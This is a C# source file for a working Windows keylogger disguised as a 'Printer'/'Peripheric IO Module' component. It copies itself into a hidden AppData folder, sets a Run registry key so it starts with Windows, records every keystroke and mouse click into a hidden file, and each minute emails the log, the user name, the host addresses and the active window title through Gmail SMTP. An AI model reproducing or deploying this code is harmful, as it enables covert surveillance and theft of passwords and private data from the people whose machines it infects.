using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.Win32;


namespace Printer
{


    class Program
    {

        private string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\printer.dll";
        private static string folderPath = Environment.CurrentDirectory;
        private static string folderName = new DirectoryInfo(folderPath).Name;

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hwnd, StringBuilder ss, int count);
        
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);



        static void Main(string[] args)
        {
           

            CopyProgram(); //calls function


            if (folderName != "PIOM")    //Checks if the program is running from the new location 
            {                            //if not runs the program from the new location
                var TestProcess = new Process();  

                TestProcess.StartInfo.FileName = "Peripheric IO Module.exe";
                TestProcess.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\PIOM";
                TestProcess.Start();
            }
         
            else //if the program is running from the new location the rest of the functions are being called
            {                          
                AddApplicationToStartup();
                new Program().start();
              
            }
           

        }      

        
        private static void CopyProgram() //Clones program to the new location
        {
           
            string sourcePath = Environment.CurrentDirectory;
            string targetPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\PIOM" ;

      

            if (!Directory.Exists(targetPath)) //Checks if the new location doesn't already exist
            {
                Directory.CreateDirectory(targetPath);

                System.IO.File.SetAttributes(targetPath, FileAttributes.Hidden);

                foreach (var srcPath in Directory.GetFiles(sourcePath))
                {
                    //Copy the file from sourcepath and place into mentioned target path, 
                    //Overwrite the file if same file is exist in target path
                    File.Copy(srcPath, srcPath.Replace(sourcePath, targetPath), true);
                }
            }
        }

        
        public static void AddApplicationToStartup() //Creates run on startup registry
        {

            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
            string execPath = Environment.CurrentDirectory + "\\" + thisFile;
            
            

          
                RegistryKey key = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                key.SetValue("PeriphericIOModule", execPath);
                key.Close();
           
        }

        private void start() 
        {
            if (System.IO.File.Exists(path)) System.IO.File.SetAttributes(path, FileAttributes.Hidden);
            System.Timers.Timer t = new System.Timers.Timer();
            t.Interval = 60000 * 1; // 60000ms(1 minute) * the number of minutes
            t.Elapsed += SendNewMessage;
            t.AutoReset = true;
            t.Enabled = true;

            


            while (true)
            {
                Thread.Sleep(5);

                for (int i = 0; i < 127; i++)
                {

                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        if (i == 8)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [BACKSPACE] ");
                                sw.Close();
                                break;

                            }

                        }



                        if (i == 17)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [CTRL] ");
                                sw.Close();
                                break;
                            }

                        }

                        Console.Write((char)i);
                        if (i == 2)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [RMB] ");
                                sw.Close();
                                break;
                            }

                        }
                        if (i == 1)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [LMB] ");
                                sw.Close();
                                break;
                            }

                        }

                        if (i == 18)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [ALT] ");
                                sw.Close();
                                break;
                            }

                        }

                        if (i == 16)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [SHIFT] ");
                                sw.Close();
                                break;
                            }

                        }
                        if (i == 9)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [TAB] ");
                                sw.Close();
                                break;
                            }

                        }
                        if (i == 91)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [WIN] ");
                                sw.Close();
                                break;
                            }

                        }
                        if (i == 13)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write(" [ENTER] ");
                                sw.Close();
                                break;
                            }

                        }

                        
                            using (StreamWriter sw = System.IO.File.AppendText(path))
                        {
                            System.IO.File.SetAttributes(path, FileAttributes.Hidden);
                            sw.Write((char)i);
                            sw.Close();
                            
                        }
                    }
                }
            }
        }
      

        private void SendNewMessage(Object source, ElapsedEventArgs e)
        {
            string ActiveWindowTitle()
            {
                //Create the variable
                const int nChar = 256;
                StringBuilder ss = new StringBuilder(nChar);

                //Run GetForeGroundWindows and get active window informations
                //assign them into handle pointer variable
                IntPtr handle = IntPtr.Zero;
                handle = GetForegroundWindow();

                if (GetWindowText(handle, ss, nChar) > 0) return ss.ToString();
                else return "";
            }


            try
            {

                string proccess = ActiveWindowTitle();
                string emailBody = "";
                string emailHeader = "";
             
                //time variable
                DateTime now = DateTime.Now;
               
                string subject = Environment.UserDomainName + "\\" + Environment.UserName;
               
                var host = Dns.GetHostEntry(Dns.GetHostName());

                foreach (var adress in host.AddressList)
                {
                    emailHeader += "Adress: " + adress;
                }


                //Email Data Header

                emailHeader += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
                emailHeader += "\nHost: " + host;
                emailHeader += "\nTime: " + now.ToString();
                emailHeader += "\nProccess: " + proccess + "\n";

                if (!System.IO.File.Exists(path))
                {
                    return;
                }

                StreamReader sr = new StreamReader(path);
                string TempContent = sr.ReadLine();
                sr.Close();
                System.IO.File.Delete(path);

                emailBody = emailHeader + TempContent;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                MailMessage mailMessage = new MailMessage();
                

                mailMessage.From = new MailAddress("EMAIL");
                mailMessage.To.Add("EMAIL");
                mailMessage.Subject = subject;
                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("EMAIL", "PASSWORD");
                mailMessage.Body = emailBody;

                client.Send(mailMessage);

            }

            
            catch (Exception ex)
            {
              
            }
        }
    }
}
